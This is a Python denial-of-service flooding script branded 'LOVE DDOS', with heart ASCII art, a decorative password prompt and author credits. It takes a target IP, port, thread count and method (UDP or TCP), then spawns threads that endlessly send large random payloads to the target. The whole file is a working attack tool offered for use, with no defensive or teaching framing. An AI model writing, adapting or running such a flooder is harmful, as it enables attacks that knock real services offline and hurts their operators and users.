import random
import socket
import time
import threading
import os , sys , codecs

os.system("clear")
print(""""\033[95m──────────────────▒
─────────────────░█
────────────────███
───────────────██ღ█
──────────────██ღ▒█──────▒█
─────────────██ღ░▒█───────██
─────────────█ღ░░ღ█──────█ღ▒█
────────────█▒ღ░▒ღ░█───██░ღღ█
───────────░█ღ▒░░▒ღ░████ღღღ█
───░───────█▒ღ▒░░░▒ღღღ░ღღღ██─────░█
───▓█─────░█ღ▒░░░░░░░▒░ღღ██─────▓█░
───██─────█▒ღ░░░░░░░░░░ღ█────▓▓██
───██────██ღ▒░░░░░░░░░ღ██─░██ღ▒█
──██ღ█──██ღ░▒░░░░░░░░░░ღ▓██▒ღღ█
──█ღღ▓██▓ღ░░░▒░░░░░░░░▒░ღღღ░░▓█
─██ღ▒▒ღღ░░ღღღღ░░▒░░░░ ღღღღ░░ღღღ██
─█ღ▒ღღ█████████ღღ▒░ღ██████████ღ▒█░
██ღღ▒████████████ღღ████████████░ღ█▒
█░ღღ████████████████████████████ღღ█
█▒ღ██████████████████████████████ღ█
██ღღ████████████████████████████ღ██
─██ღღ██████████████████████████ღ██
──░██ღღ██████████████████████ღღ██
────▓██ღ▒██████████████████▒ღ██
───░──░███ღ▒████████████▒ღ███
────░░───▒██ღღ████████▒ღ██
───────────▒██ღ██████ღ██
─────────────██ღ████ღ█
───────────────█ღ██ღ█
────────────────█ღღ█
────────────────█ღ█░
─────────────────██░""")

password ="love"

for i in range(3):
	pwd = input("\033[97m[?] Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[97m[•] Correct...")
		break
	else:
		time.sleep(5)
		print("\033[91m[×] Wrong Password : ")
		continue
time.sleep(5)
print("\033[97m[•] Login \033[92mAuthorized!!! ")
time.sleep(5)
os.system("clear")

print("""

\033[32m __    _____  _  _  ____ 
(  )  (  _  )( \/ )( ___)
 )(__  )(_)(  \  /  )__) 
(____)(_____)  \/  (____)
 ____  ____  _____  ____ 
(  _ \(  _ \(  _  )(_   )
 )(_) ))(_) ))(_)(  / /_ 
(____/(____/(_____)(____)

""")

print("""
\033[95m [•] Codes : ZieLx
 [$] Methods : UDP - TCP
 [#] Created : 13/Jul/2022
 [%] Discord : Z1#7872
 """)

choice =str(input("\033[96m[?] Methods : \033[91m"))
ip =str(input("\033[96m[•] Ip Target :\033[91m "))
port =int(input("\033[96m[$] Port Target : \033[91m"))
times =int(input("\033[96m[@] Times :\033[91m "))
threads =int(input("\033[96m[#] Threads :\033[91m "))

def udp():
	data = random._urandom(1811)
	i = random.choice(("[•]","[#]","[$]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[95m Send Love To\033[91m %s \033[95mPort\033[91m %s"%(ip,port))
		except:
			print("\033[95m[§] Send Love To\033[91m %s \033[95mPort\033[91m %s"%(ip,port))

def tcp():
	data = random._urandom(102400)
	i = random.choice(("[•]","[$]","[§]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
				print("\033[95m Send Love To\033[91m %s \033[95mPort\033[91m %s"%(ip,port))
		except:
			s.close()
			print("\033[95m[$] Send Love To\033[91m %s \033[95mPort\033[91m %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
			